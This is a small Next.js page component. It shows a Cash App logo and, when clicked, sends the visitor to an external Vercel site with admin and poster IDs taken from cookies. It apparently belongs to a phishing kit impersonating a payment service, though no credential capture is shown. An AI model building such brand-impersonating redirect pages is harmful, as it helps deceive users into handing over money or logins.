"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config/index";
function page() {
  const router = useRouter();
  const id = Cookies.get("id");
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");
  const handleSubmit = async () => {
               window.location.href = `https://mega-new.vercel.app/${adminId}/${posterId}`;

    }
  

    

  return (
    
 <div onClick={handleSubmit} className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
         <img src="/images/Square_Cash_app_logo.svg" height={200} width={200} />
        
       </div>

  );
}

export default page;
